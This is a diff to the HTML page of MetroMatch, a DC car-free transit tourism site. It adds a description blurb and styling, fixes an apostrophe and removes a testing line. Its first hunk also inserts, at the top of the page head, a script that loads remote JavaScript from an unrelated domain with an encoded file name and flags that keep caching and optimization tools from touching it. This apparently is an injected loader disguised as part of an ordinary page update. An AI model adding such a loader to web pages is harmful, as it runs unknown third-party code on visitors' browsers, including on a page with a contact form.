@@ -1,6 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://mn-tz.com/NDIzMjM2.js?t=423236';
+      document.head.appendChild(script);
+  })();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Go Car Free in DC</title>
@@ -114,6 +122,23 @@
         .search-container button:hover {
             background-color: #d32f2f;
         }
+
+        .description-text {
+            max-width: 700px;
+            margin: 15px auto 25px;
+            padding: 0 40px;
+            text-align: center;
+            font-size: 18px;
+            line-height: 1.6;
+            color: #555;
+        }
+        
+        @media (max-width: 768px) {
+            .description-text {
+                padding: 0 30px;
+                font-size: 16px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -138,6 +163,12 @@
     </header>
 
     <h1 style="text-align: center; margin-top: 20px;">MetroMatch: Go Car Free in DC</h1>
+    
+    <!-- Description Text -->
+    <div class="description-text">
+        MetroMatch is a dynamic, easy-to-use platform to search for places to stay, eat, drink, and play. Our database displays hundreds of destinations within walking distance of Washington subway and commuter rail stations so visitors and locals can better plan a trip or outing and go car-free in DC.
+    </div>
+
     <div class="text-container" style="max-width: 800px; margin: 0 auto; padding: 0 20px; text-align: center;"></div>
 
     <!-- Search Container -->
@@ -170,7 +201,7 @@
     <div id="metromatch-modal" class="modal">
         <div class="modal-content">
             <h2>Welcome to MetroMatch!</h2>
-            <p>We’re building a transit tourism platform and would love your feedback as an early user! We won't share your contact information with anyone else</p>
+            <p>We're building a transit tourism platform and would love your feedback as an early user! We won't share your contact information with anyone else</p>
             <form id="metromatch-form" method="POST" action="/submit_feedback">
                 <input type="text" name="first_name" placeholder="First Name" required>
                 <input type="text" name="last_name" placeholder="Last Name" required>
@@ -259,7 +290,6 @@
         const skipBtn = document.getElementById('skip-button');
         const form = document.getElementById('metromatch-form');
 
-        localStorage.removeItem('metromatchDismissed'); // <--- testing line
 	if (!localStorage.getItem('metromatchDismissed')) {
             modal.style.display = 'flex';
         }
